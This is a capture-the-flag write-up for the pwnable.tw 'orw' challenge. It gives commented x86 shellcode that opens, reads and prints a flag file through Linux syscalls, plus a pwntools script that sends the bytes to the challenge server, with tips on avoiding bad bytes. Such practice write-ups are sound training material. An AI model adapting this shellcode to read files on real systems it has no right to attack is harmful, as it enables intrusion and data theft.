# ORW
> LongChampion, 26/03/2020

## Ideal
Write a x86 shellcode that use `sys_open`, `sys_read` and `sys_write` to read the flag at `/home/orw/flag`

## Make a Shellcode
I have written this x86 assembly, all explaintations are "hardcode" in this :)
```
global _start

section .text
_start:
    xor     eax, eax
    push    eax                         ; "\0" for file name
    push    0x67616c66                  
    push    0x2f77726f
    push    0x2f656d6f
    push    0x682f2f2f                  ; hex of "/home/orw/flag" (in reversed order)
    mov     ebx, esp                    ; ebx = &filename
    xor     ecx, ecx                    ; ecx: flag = 0 = O_RDONLY
    xor     edx, edx                    ; edx: mode = 0 = O_RDONLY
    mov     al, 0x5                     ; eax = 0x5 = sys_open
    int     0x80

    mov     ebx, eax                    ; get file_descriptor (fd)
    add     esp, 0xffffff80             ; same as "sub $esp, 0x80" but don't have bytecode "\x00"
    mov     ecx, esp                    ; ecx = &buf
    xor     edx, edx
    mov     dl, 0x7f                    ; edx = 0x7f = 127 (number of bytes to read)
    xor     eax, eax
    mov     al, 0x3                     ; eax = 0x3 = sys_read
    int     0x80

    xor     ebx, ebx
    inc     ebx                         ; ebx = 1 = stdout
    mov     ecx, esp                    ; ecx = &buf
    xor     edx, edx
    mov     dl, 0x26                    ; edx = 0x26 = 38 (number of bytes to write out)
    xor     eax, eax
    mov     al, 0x4                     ; eax = 0x4 = sys_write
    int     0x80

    xor     eax, eax
    inc     eax                         ; eax = 0x1 = sys_exit
    xor     ebx, ebx                    ; ebx: exitcode = 0
    int     0x80

```
- How to assemble the assembly to bytecode? Go [here](https://defuse.ca/online-x86-assembler.htm#disassembly)
- Do not understand linux syscall and it argument? Go [here](https://syscalls.kernelgrok.com/)
- You can write your shellcode as well, and make sure that you avoid bytecode like `\x0a` and `\x00`
- I had have a flag, so I know that is 38 bytes in lenght, and I use it in the assembly for a clean output. If you don't know how long the flag is, you can assume that is 100 bytes in length.
- My shellcode use sys_exit, no problem, I still get flag normally.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

shellcode =\
    "\x31\xC0\x50\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F" \
    "\x68\x2F\x2F\x2F\x68\x89\xE3\x31\xC9\x31\xD2\xB0\x05\xCD\x80\x89\xC3\x83"\
    "\xC4\x80\x89\xE1\x31\xD2\xB2\x7F\x31\xC0\xB0\x03\xCD\x80\x31\xDB\x43\x89"\
    "\xE1\x31\xD2\xB2\x26\x31\xC0\xB0\x04\xCD\x80\x31\xC0\x40\x31\xDB\xCD\x80"

r = remote("chall.pwnable.tw", 10001)
r.sendlineafter("shellcode:", shellcode)
print r.recvall()
r.close()
```
Run it and you will see that flag. Enjoy!!!
